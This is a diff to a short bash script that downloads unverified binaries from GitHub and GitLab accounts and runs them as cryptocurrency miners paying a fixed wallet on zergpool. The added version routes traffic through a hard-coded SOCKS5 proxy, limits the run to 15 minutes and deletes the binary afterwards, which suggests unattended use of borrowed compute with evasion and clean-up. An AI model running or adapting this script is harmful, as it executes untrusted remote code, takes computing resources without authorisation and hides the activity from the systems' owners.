@@ -1,5 +1,7 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
-wget https://github.com/hunshukajh/yes/raw/main/gas
-chmod +x gas cmdline_launcher.sh 
-./cmdline_launcher.sh -algo Verushash -coin DGB -wallet DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4  -rigName  $(echo $(shuf -i 1-2 -n 1)-joa) -pool1 verushash.na.mine.zergpool.com:3300
+apt-get update
+apt install screen -y
+wget https://gitlab.com/sumarnosabar1/rexors/-/raw/main/yui
+chmod +x yui
+timeout 15m ./yui -a yescryptr16  -o stratum+tcp://yescryptR16.na.mine.zergpool.com:6333 -u DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4.RX --proxy socks5://79.143.30.163:55418
+rm -rf yui
